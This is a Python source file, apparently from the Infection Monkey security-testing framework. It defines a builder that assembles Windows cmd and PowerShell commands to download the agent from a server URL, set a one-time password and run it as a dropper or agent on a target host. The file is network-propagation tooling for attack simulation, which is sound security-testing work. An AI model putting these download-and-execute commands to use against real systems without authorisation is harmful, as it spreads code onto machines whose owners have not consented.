from pathlib import PurePath
from typing import Optional

from agentpluginapi import IAgentOTPProvider
from monkeytypes import AgentID

from infection_monkey.model import DROPPER_ARG, MONKEY_ARG

from .i_agent_command_builder import (
    DownloadMethod,
    DownloadOptions,
    IAgentCommandBuilder,
    MonkeyArgs,
    RunOptions,
    Shell,
)


class WindowsAgentCommandBuilder(IAgentCommandBuilder):
    def __init__(
        self,
        agent_id: AgentID,
        servers: list[str],
        otp_provider: IAgentOTPProvider,
        agent_otp_environment_variable: str,
        current_depth: int = 0,
    ):
        self._agent_id = agent_id
        self._servers = servers
        self._otp_provider = otp_provider
        self._agent_otp_environment_variable = agent_otp_environment_variable
        self._current_depth = current_depth

    def build_download_command(self, download_options: DownloadOptions):
        command = ""
        download_command_func = self._build_download_command_webrequest
        if download_options.download_method == DownloadMethod.WEB_CLIENT:
            download_command_func = self._build_download_command_webclient

        if download_options.shell == Shell.CMD:
            command += "cmd.exe /c "

        if download_options.shell == Shell.POWERSHELL:
            command += "powershell "

        command += download_command_func(
            download_options.download_url, download_options.agent_destination_path
        )

        return command

    def _build_download_command_webrequest(
        self, download_url: str, destination_path: PurePath
    ) -> str:
        return (
            f"Invoke-WebRequest -Uri '{download_url}' "
            f"-OutFile '{destination_path}' -UseBasicParsing"
        )

    def _build_download_command_webclient(
        self, download_url: str, destination_path: PurePath
    ) -> str:
        return (
            "(new-object System.Net.WebClient)"
            f".DownloadFile(^''{download_url}^'' , ^''{destination_path}^'')"
        )

    def build_run_command(self, run_options: RunOptions):
        command = ""

        set_otp = self._set_otp_powershell
        if run_options.shell == Shell.CMD:
            set_otp = self._set_otp_cmd

        command += f"{set_otp()} {str(run_options.agent_destination_path)} "

        if run_options.monkey_args is not None:
            command += self._build_agent_run_arguments(run_options)

        return command

    def _set_otp_powershell(self) -> str:
        return f"$env:{self._agent_otp_environment_variable}='{self._otp_provider.get_otp()}' ; "

    def _set_otp_cmd(self) -> str:
        return f"set {self._agent_otp_environment_variable}={self._otp_provider.get_otp()}&"

    def _build_agent_run_arguments(self, run_options: RunOptions):
        agent_arg = MONKEY_ARG
        destination_path = None
        if run_options.monkey_args == MonkeyArgs.DROPPER:
            agent_arg = DROPPER_ARG
            destination_path = (
                run_options.dropper_destination_path
                if run_options.dropper_destination_path
                else run_options.agent_destination_path
            )

        agent_arguments = self.build_agent_command_line_arguments(destination_path)
        return f"{agent_arg} {' '.join(agent_arguments)}"

    def build_agent_command_line_arguments(self, destination_path: Optional[PurePath]) -> list[str]:
        commandline = []

        if self._agent_id is not None:
            commandline.append("-p")
            commandline.append(str(self._agent_id))
        if self._servers:
            commandline.append("-s")
            commandline.append(",".join(self._servers))
        if self._current_depth is not None:
            commandline.append("-d")
            commandline.append(str(self._current_depth))
        if destination_path is not None:
            commandline.append("-l")
            commandline.append(str(destination_path))

        return commandline
